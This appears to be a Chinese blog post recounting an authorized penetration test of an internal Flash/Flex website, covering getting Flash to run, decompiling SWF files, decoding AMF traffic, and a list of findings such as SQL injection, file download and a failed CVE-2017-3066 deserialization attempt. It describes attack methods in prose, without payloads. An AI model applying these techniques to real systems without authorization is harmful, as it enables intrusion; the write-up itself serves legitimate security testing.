    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>在2025年8月的平凡一天，去客户现场进行渗透测试，遇到了一个Flash网站，我打算在这部分说下我遇到的问题及解决方案。</p>
<p>测试环境</p>
<ol>
<li>内网环境测试系统</li>
<li>测试机为Windows，2021版Burp</li>
</ol>
<h3 id="flash功能" class="heading-element"><span>Flash功能</span>
  <a href="#flash%e5%8a%9f%e8%83%bd" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>打开网站，遇到的第一个问题是能打开测试系统，但是功能访问异常，很多功能点击后都是一块白屏，抓包发现网站会下载swf文件。这种情况下，测试肯定是不全面的，因此最好还是能正常访问测试系统的所有功能。</p>
<p>我意识到这是一个Flash网站，功能异常的原因是当前浏览器（用的Burp自带的浏览器）不支持Flash。</p>
<p>接下去尝试更好浏览器，第一反应是用IE，调用IE打开的是Edge（被集成了），但是也不支持Flash；Chrome、Firefox都试了，当前系统的版本都不支持Flash。</p>
<p>网上找解决方法，以下是用到的一些工具和坑</p>
<ul>
<li><a href="https://www.bilibili.com/opus/651094862871920662"target="_blank" rel="external nofollow noopener noreferrer">可能是2025年依然能在浏览器中使用Flash的多种方法</a> ，尝试了其提到的方法
<ul>
<li><a href="https://github.com/Mzying2001/CefFlashBrowser/"target="_blank" rel="external nofollow noopener noreferrer">CefFlashBrowser</a>，评价：能运行Flash，但是有Bug，遇到下载功能会崩溃</li>
<li><a href="https://huanmvp.lanzouv.com/ii0ch0blxyqb"target="_blank" rel="external nofollow noopener noreferrer">chrome53</a>，评价：挺好用的，没发现问题</li>
<li>安装Flash Player，并使用支持Flash的浏览器：这个方案我起初是拒绝的，因为不想要安装太多乱七八糟的东西，Flash Player在我这的印象不是很好。但是后面为了测试SWF，还是用到了。</li>
</ul>
</li>
</ul>
<p>解决了Flash功能的正常访问，那就可以正常测试下去了。</p>
<h3 id="正常测试" class="heading-element"><span>正常测试</span>
  <a href="#%e6%ad%a3%e5%b8%b8%e6%b5%8b%e8%af%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>接下去就是正常测试了，我注意到了网站会下载SWF文件，以及调用 amf 接口进行序列化数据的传输，关于这两部分都是值得探索的测试点。但由于时间有限，要优先完成测试，于是我计划先测普通的功能点，在舒适区内先产出，之后再对这两者进行测试。</p>
<p>在这部分，我就提一嘴发现的漏洞有：登录过程的用户名、密码枚举，弱口令用户，功能点未授权访问、越权访问，任意文件下载，SQL注入。</p>
<ul>
<li>其中就SQL注入值得说一下，它是来自一个隐藏挺深的功能点，访问该功能点后会有wsdl文档，解析该文档找到一个查询接口，在该接口中存在注入点，通过oracle报错注入拿下。</li>
</ul>
<p>测试的差不多了，虽然产出也不错了，但是还是忘不了 SWF文件和 AMF接口的二进制数据，接下去就是去研究那两个了。</p>
<h3 id="swf" class="heading-element"><span>SWF</span>
  <a href="#swf" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>具体的研究结果就体现在上面的文章中了，只不过当时时间有限，了解的没文章中那么具体，也踩了很多坑。</p>
<p>我批量下载了SWF文件，并通过 ffdec 进行了反编译，之后将数据全部复制到一个目录中。</p>
<p>接下去考虑是否像看过的很多文章一样去挖XSS，但是我放弃了，因为太费时费力了，时间不够，对 actionScript又不了解，放弃了这条路。</p>
<p>之后我对这些SWF文件进行敏感数据挖掘，说白了就是用自己的工具扫了遍文件，期望找到些敏感信息，可惜没达到预期。</p>
<p>没找到很满意的敏感信息，在一个as文件中找到了几个接口</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">	&lt;channels&gt;
</span></span><span class="line"><span class="cl">		&lt;channel id=&#34;my-http&#34; type=&#34;mx.messaging.channels.HTTPChannel&#34;&gt;
</span></span><span class="line"><span class="cl">			&lt;endpoint uri=&#34;http://{server.name}:{server.port}/AtomLocal/messagebroker/http&#34;/&gt;
</span></span><span class="line"><span class="cl">			&lt;properties&gt;
</span></span><span class="line"><span class="cl">			&lt;/properties&gt;
</span></span><span class="line"><span class="cl">		&lt;/channel&gt;
</span></span><span class="line"><span class="cl">		&lt;channel id=&#34;my-polling-amf&#34; type=&#34;mx.messaging.channels.AMFChannel&#34;&gt;
</span></span><span class="line"><span class="cl">			&lt;endpoint uri=&#34;http://{server.name}:{server.port}/AtomLocal/messagebroker/amfpolling&#34;/&gt;
</span></span><span class="line"><span class="cl">			&lt;properties&gt;
</span></span><span class="line"><span class="cl">				&lt;polling-enabled&gt;true&lt;/polling-enabled&gt;
</span></span><span class="line"><span class="cl">				&lt;polling-interval-seconds&gt;1&lt;/polling-interval-seconds&gt;
</span></span><span class="line"><span class="cl">			&lt;/properties&gt;
</span></span><span class="line"><span class="cl">		&lt;/channel&gt;
</span></span><span class="line"><span class="cl">		&lt;channel id=&#34;my-amf&#34; type=&#34;mx.messaging.channels.AMFChannel&#34;&gt;
</span></span><span class="line"><span class="cl">			&lt;endpoint uri=&#34;http://{server.name}:{server.port}/AtomLocal/messagebroker/amf&#34;/&gt;
</span></span><span class="line"><span class="cl">			&lt;properties&gt;
</span></span><span class="line"><span class="cl">				&lt;polling-enabled&gt;false&lt;/polling-enabled&gt;
</span></span><span class="line"><span class="cl">			&lt;/properties&gt;
</span></span><span class="line"><span class="cl">		&lt;/channel&gt;
</span></span><span class="line"><span class="cl">		&lt;channel id=&#34;my-streaming-amf&#34; type=&#34;mx.messaging.channels.StreamingAMFChannel&#34;&gt;
</span></span><span class="line"><span class="cl">			&lt;endpoint uri=&#34;http://{server.name}:{server.port}/AtomLocal/messagebroker/streamingamf&#34;/&gt;
</span></span><span class="line"><span class="cl">			&lt;properties&gt;
</span></span><span class="line"><span class="cl">			&lt;/properties&gt;
</span></span><span class="line"><span class="cl">		&lt;/channel&gt;</span></span></code></pre></td></tr></table>
</div>
</div><p>其他几个都是跟amf有关的，一个跟http相关的接口。</p>
<blockquote>
<p>这其实是一个  Flex 框架中用于配置消息传递通道的 服务配置 XML，它定义了一个 AMF（Action Message Format）协议的通信通道，用于 Flex 客户端与服务器之间的远程数据交互。</p>
</blockquote>
<p>当时没研究那么多，就对HTTP接口进行测试，服务端返回了报错的xml。</p>
<p>尝试构造xml，xxe进行攻击HTTP接口，最终失败了，没收获。</p>
<p>事后查了一下，这其实是 Flex框架的配置文件，具体解释如下：</p>
<blockquote>
<ol>
<li><strong><code>&lt;channel id=&quot;my-amf&quot; type=&quot;mx.messaging.channels.AMFChannel&quot;&gt;</code></strong>
<ul>
<li><code>id=&quot;my-amf&quot;</code>：给通道定义唯一标识（<code>my-amf</code>），方便在 Flex 客户端代码中引用（如指定远程调用使用该通道）。</li>
<li><code>type=&quot;mx.messaging.channels.AMFChannel&quot;</code>：指定通道类型为<code>AMFChannel</code>，这是 Flex 中基于 AMF 协议的通信通道类，用于高效序列化 / 反序列化 ActionScript 对象与服务器端数据（通常对应 Java 的 BlazeDS 或 LCDS 框架）。</li>
</ul>
</li>
<li><strong><code>&lt;endpoint uri=&quot;http://{server.name}:{server.port}/AtomLocal/messagebroker/amf&quot;/&gt;</code></strong>
<ul>
<li>定义服务器端的消息代理（Message Broker）端点 URL，Flex 客户端将通过这个 URL 与服务器建立通信。</li>
<li><code>{server.name}</code>和<code>{server.port}</code>是占位符，运行时会被替换为实际的服务器域名 / IP 和端口。</li>
<li><code>/AtomLocal/messagebroker/amf</code>是服务器端消息代理的路径，对应 BlazeDS/LCDS 框架中处理 AMF 请求的 Servlet 映射。</li>
</ul>
</li>
<li><strong><code>&lt;properties&gt;&lt;polling-enabled&gt;false&lt;/polling-enabled&gt;&lt;/properties&gt;</code></strong>
<ul>
<li><code>properties</code> 为配置通道的附加属性：</li>
<li><code>polling-enabled</code>设为<code>false</code>，表示禁用客户端主动轮询（Polling）机制。AMFChannel 默认支持 “长轮询” 或 “实时推送”，禁用后通常依赖服务器主动推送（如使用 RTMP 通道）或客户端按需发起请求。</li>
</ul>
</li>
</ol>
</blockquote>
<h3 id="amf" class="heading-element"><span>AMF</span>
  <a href="#amf" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>接下去研究 amf 接口</p>
<p>最终用了上文提到的那几款工具，因为没达到预期效果，总是会有解码不了的场景，因此这几款工具我都试了，最后由于时间紧迫，将就用了。</p>
<p>成功对 AMF 接口序列化数据进行解码后，我发现了 未授权执行任意SQL语句、反序列化 漏洞，不过CVE-2017-3066的反序列化最终没有打成功，收到RMI回连了，但是没执行命令。因为时间关系也没法继续研究了。</p>
<h3 id="事后" class="heading-element"><span>事后</span>
  <a href="#%e4%ba%8b%e5%90%8e" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>事后我总结了这次测试记录，形成了这篇文章。</p>
<p>在整理的过程中，又阅读了很多文章，对相关内容有了更多的了解。</p>
<p>对这次没能测试到的很多漏洞，感觉有点遗憾。</p>
<p>这篇文章其实也写的比较匆忙，因为不想为这个过时的技术花费太多时间，感觉性价比较低，但有时又在想是不是应该再深入一下，总是会纠结。</p>
<p>匆匆忙忙，总在跟时间赛跑，好像被什么东西追赶着，我还有一大堆的ToDo List，人说选择很重要，要学会拿起更要学会放下，就这样吧，不多说了。</p>
<hr>
<p>也许还没完，我刚刷到一篇文章，是一个2024年，较新漏洞的分析：</p>
<ul>
<li><a href="https://xz.aliyun.com/news/13481"target="_blank" rel="external nofollow noopener noreferrer">SolarWinds Security Event Manager AMF 反序列化 RCE (CVE-2024-0692)</a></li>
</ul>
<p>后续可能就不是针对Flash测试的文章，会针对 AMF 反序列化这系列漏洞进行分析学习。（<em>又是新坑，ToDoList又增加了。。。咕咕咕🕊</em>）</p>
<p>有兴趣的朋友也可以一起研究下，我给一些参考文章：</p>
<ul>
<li><a href="https://cn-sec.com/archives/2323918.html"target="_blank" rel="external nofollow noopener noreferrer">浅说AMF反序列化及利用链构造</a></li>
<li><a href="https://www.liuhaihua.cn/archives/642555.html"target="_blank" rel="external nofollow noopener noreferrer">Java AMF3反序列化漏洞</a></li>
</ul>
<h2 id="参考文献" class="heading-element"><span>参考文献</span>
  <a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%8c%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><a href="https://developer.aliyun.com/article/408379"target="_blank" rel="external nofollow noopener noreferrer">全面认识Flash技术</a></li>
<li><a href="https://xz.aliyun.com/news/3051"target="_blank" rel="external nofollow noopener noreferrer">探寻Flash SWF中的漏洞</a> 先知，翻译，原文：http://10degres.net/testing-flash-swf/</li>
<li><a href="https://ret2libc.wordpress.com/2016/04/04/analysing-swf-files-for-vulnerabilities/"target="_blank" rel="external nofollow noopener noreferrer">Analysing SWF files for vulnerabilities</a></li>
<li><a href="http://media.wix.com/ugd/533dd4_c096c1fa67814318acb84d41a04fb258.pdf"target="_blank" rel="external nofollow noopener noreferrer">Finding vulnerabilities in SWF files (v2.0)</a></li>
<li><a href="https://cn-sec.com/archives/321701.html"target="_blank" rel="external nofollow noopener noreferrer">一次 SWF XSS 挖掘和利用</a>， 乌云 drops</li>
<li><a href="https://www.freebuf.com/articles/web/169873.html"target="_blank" rel="external nofollow noopener noreferrer">浅析同源方式执行（SOME）攻击</a></li>
<li><a href="https://www.designswan.com/archives/actionscript-30-flashs-security-sandbox.html"target="_blank" rel="external nofollow noopener noreferrer">Actionscript 3.0 – Flash Security Sandbox</a>： 英文原文</li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing"target="_blank" rel="external nofollow noopener noreferrer">Testing for Cross Site Flashing</a></li>
<li><a href="https://ret2libc.wordpress.com/2016/04/04/analysing-swf-files-for-vulnerabilities/"target="_blank" rel="external nofollow noopener noreferrer">Analysing SWF files for vulnerabilities</a></li>
<li><a href="https://xz.aliyun.com/news/7994"target="_blank" rel="external nofollow noopener noreferrer">谈谈AMF网站的渗透测试</a></li>
<li><a href="https://www.keysight.com/blogs/en/tech/nwvs/2025/03/18/cve-2017-3066"target="_blank" rel="external nofollow noopener noreferrer">CVE-2017-3066: Adobe ColdFusion Deserialization Vulnerability</a></li>
</ul>
<h2 id="文件属性" class="heading-element"><span>文件属性</span>
  <a href="#%e6%96%87%e4%bb%b6%e5%b1%9e%e6%80%a7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>创建时间：2025-08-16   13:33</p>
<p>修订记录：</p>
<ul>
<li>2025-08-16 ，此次修订内容| 新建</li>
<li>2025-08-19 ，此次修订内容| 完成1.0版</li>
</ul>
<p>备注：
老技术，收藏夹吃灰就行</p></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="更新于 2025-08-16 08:05:53">更新于 2025-08-16&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/pentest/" class="post-tag" title="标签 - Pentest">Pentest</a><a href="/tags/flash/" class="post-tag" title="标签 - Flash">Flash</a><a href="/tags/amf/" class="post-tag" title="标签 - AMF">AMF</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/aisecurity_math/" class="post-nav-item" rel="prev" title="AI安全-数学基础"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>AI安全-数学基础</a></div>
</div>
<div id="comments"><div id="giscus" class="comment">
          <script
            src="https://giscus.app/client.js"
            data-repo="XavierRoot/XavierBlog"
            data-repo-id="R_kgDOHswyxg"
            data-category="Announcements"
            data-category-id="DIC_kwDOHswyxs4Cd2zm"
            data-mapping="title"
            data-strict="0"
            
            data-theme="preferred_color_scheme"
            data-reactions-enabled="1"
            data-emit-metadata="0"
            data-input-position="bottom"
            data-lang="en"
            data-loading="lazy"
            crossorigin="anonymous"
            async
            defer
          ></script>
        </div>
        <noscript>
          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
        </noscript></div></article>

  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div></div>
    <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [['$','$'], ['\\(','\\)']],
        processEscapes: true
      }
    });
</script>

<script src='https://cdn.jsdelivr.net/npm/mathjax@2.7.4/MathJax.js?config=TeX-AMS-MML_HTMLorMML' async></script>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="https://vercount.one/js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark","lightTheme":"light","origin":"https://giscus.app"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightgallery":true,"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};</script><script src="/js/theme.min.js" defer></script></body>
</html>
